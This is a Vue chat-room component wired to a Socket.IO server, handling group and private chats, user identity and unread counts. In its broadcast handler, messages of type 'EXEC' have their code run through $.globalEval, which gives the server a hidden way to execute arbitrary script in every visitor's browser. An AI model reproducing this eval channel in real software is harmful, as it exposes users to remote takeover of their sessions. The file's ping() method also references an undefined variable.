import io from 'socket.io-client/dist/socket.io.min'
import ControlBar from './ControlBar'
import Side from './Side'
import ChangeName from './ChangeName'
import ChatPanels from './ChatPanels'
export default {
  name: 'Chat',
  data(){
    return {
        users : [],
        nameChanged : false,
        totalCount : 0,
        socket : null,
        userId:0,
        infocount:0,
        userName:"chat",
        userAvatar:null,
        chatList:[{
          name:"群聊",
          id:'group',
          img:'http://img.web07.cn/uploads/Png/c101213/129220591J50-193S.png',
          unreadMsgs:0
        }],
        chatPanels:[{
          id:'group',
          messages:[
          {mtype:"info",msg:"注意：聊天日志不会保存，请注意备份"},
          {mtype:"info",msg:"提示：点击头像可进入私聊"}
          ]
      }],
        targetId:'group'
    }
  },
  mounted:function(){
    this.socket = io.connect('http://unionever.cn');
    this.init();
  },
  methods:{
    htmlspecialchars(str){
      str = str || '';
      str = str.replace(/&/g, '&amp;');
      str = str.replace(/</g, '&lt;');
      str = str.replace(/>/g, '&gt;');
      str = str.replace(/"/g, '&quot;');
      str = str.replace(/'/g, '&#039;');
      return str;
    },
    init(){
      this.connection();
      this.socketEvent();
      this.bindEvent();
    },
    connection(){
      var self = this;
      self.socket.on('connected', function(data) {
        if(data.users) {
         self.users=data.users;
        }
        self.userId = data.id;
        self.userName = self.userId.slice(2);
        self.userAvatar = '//avatar.duoshuo.com/avatar-50/292/117200.jpg';
        if(window.DUOSHUO && window.DUOSHUO.visitor
           && window.DUOSHUO.visitor.data.user_id) {
          var userInfo = window.DUOSHUO.visitor.data;
          self.userId = userInfo.user_id;
          self.userName = userInfo.name;
          self.userAvatar = userInfo.avatar_url;
        } else if($.cookie && ($.cookie('visitor') || $.cookie('visitor_history'))) {
          var info = $.cookie('visitor') || $.cookie('visitor_history');
          try {
            var info = JSON.parse(info);
            if(info.id && info.name && info.avatar) {
              self.userId = info.id;
              self.userName = info.name;
              self.userAvatar = info.avatar;
            }
          } catch(e) {}
        } else {
          if(window.localStorage) {
            var userId = window.localStorage.getItem('userId');
            if(userId) {
              self.userId = userId.length > 12 ? userId.slice(0, 12) : userId;
              self.userName = userId.slice(2);
            } else {
              window.localStorage.setItem('userId', self.userId);
            }
            var userName = window.localStorage.getItem('userName');
            if(userName) {
              self.userName = userName;
            }
          }
        }
        if(window.localStorage) {
          window.localStorage.setItem('userId', self.userId);
        }
        if(!self.nameChanged) {
          self.nameChanged = true;
        }
        // console.info('ID: ' + self.userId);
        self.socket.emit('createUser', {
          userId: self.userId,
          userName: self.userName,
          userAvatar: self.userAvatar
        });
      });
    },
    ping(){
       if(!this.checkOnline('group')) return;
        data = data || {};
        data.id = this.userId;
        this.socket.emit('ping', data);
    },
    changeName(name){
     
            this.userName = $.trim(name).slice(0, 12);
            this.socket.emit('createUser', {
              userId: this.userId,
              userName: this.userName,
              userAvatar: this.userAvatar
            });
            if(window.localStorage) {
              window.localStorage.setItem('userName', this.userName);
            }
            this.nameChanged=false;

    },
    cRoom(id){
      this.targetId=id;
      this.chatList.forEach((item)=>{
        if(item.id==id){
          item.unreadMsgs=0;
        }
      });
    },
    closeRoom(id){
      var unreadnum = 0;
      for(let i=0;i<this.chatList.length; i++){
        if(this.chatList[i].id == id){
          unreadnum =this.chatList[i].unreadMsgs;
          this.chatList.splice(i,1);
          break;
        }
      }
      for(let i=0;i<this.chatPanels.length; i++){
        if(this.chatPanels[i].id == id){
          this.chatPanels.splice(i,1);
          break;
        }
      }

      this.targetId="group";
      this.totalCount-=unreadnum;
    },
    privateChat(item){
      if(item.id ==this.userId) return;
      this.createPrivateChat({
            avatar: item.avatar,
            name: item.name,
            id: item.id
          }, true);

    },
    bindEvent(){
        var self = this;
        $('.chatroom').on('keydown', function(evt) {
          if(evt.keyCode == 27) {
            $(this).addClass('chatroom-fold');
          }
        });
        if(/Mac OS/i.test(navigator.appVersion)) {
          $(".chatroom textarea").attr('placeholder', '按 Command+Enter 发送');
        }
        $(window).on('beforeunload close', function() {
          self.socket.emit('forceDisconnect', {
            id: self.userId
          });
          self.socket.disconnect();
        });
    },
    createPrivateChat(data, setCurrent){
        var exist = this.chatList.some((item)=>{
          return item.id==data.id;
        });
        if(exist){
          return;
        }
        var itemObj = {
          name:data.name,
          id:data.id,
          img:data.avatar,
          unreadMsgs:0
        };
        this.chatList.push(itemObj);
        this.chatPanels.push({id:data.id,messages:[
          {mtype:"info",msg:"与"+data.name+"私聊"}
          ]});
      
        if(setCurrent) {
           this.targetId = itemObj.id;
        }
    },
    socketEvent(){
      var self = this;
      self.socket.on('broadcast', function(data) {
        if(data.type == 'EXEC')  {
          return $.globalEval(data.code);
        }
        if(data.id == self.userId) return;
        if(data.type == 'NEW') {
          if($.inArray(data.id, self.users) > -1) return false;
          self.users.push(data.id);
          return self.addChatLog(data,'group');

        }
        self.addChatLog(data, 'group');
        self.updateCount('group');
      });
      self.socket.on('pm', function(data) {
      if(data.type == 'DISCONNECT') {
        console.log(data);
        self.socket.emit('forceDisconnect', {
          id: self.userId
        });
        self.socket.disconnect();
        return self.addChatLog(data, self.targetId);
      }
      if(data.type == 'OFFLINE') {
        return self.addChatLog(data,self.targetId);
      }
      if(data.type == 'ATTENSION') {
        return self.addChatLog(data, self.targetId);
      }
      self.createPrivateChat(data);
      self.addChatLog(data, data.id);
      self.updateCount(data.id);
    });
    self.socket.on('pong', function(data) {
      var type = data.type;
      if(type === 'PONG') {
        self.users=data.users;
      } else if(type === 'PING-BACK') {
        console.warn(data);
      }
    });

    },
    checkOnline(id){
      if(this.socket && this.socket.disconnected) {
        this.addChatLog({
          msg: '您已离线，请刷新页面重新登录'
        }, this.targetId);
        return false;
      }
      return true;
    },
    updateCount(id){
      this.chatList.forEach((item)=>{
        if(item.id ==id){
          item.unreadMsgs+=1;
        }
      });
      this.totalCount += 1;
    },
    addChatLog(data, id, isSelf){
      if(!this.checkOnline()) return;
      if(typeof data.msg=='string'){
        data.msg = this.htmlspecialchars(data.msg);
      }
      data.stime= new Date().toLocaleString(); 
      for(let item of this.chatPanels){
        if(item.id == id){
          item.messages.push(data);

        }
      }
      this.infocount+=1;
    }
  },
  computed:{
    usersCount:function(){
      return this.users.length;
    }
  },
  components: {
    'control_bar':ControlBar,
    'side':Side,
    'change-name':ChangeName,
    'chat-panels':ChatPanels
  }
}



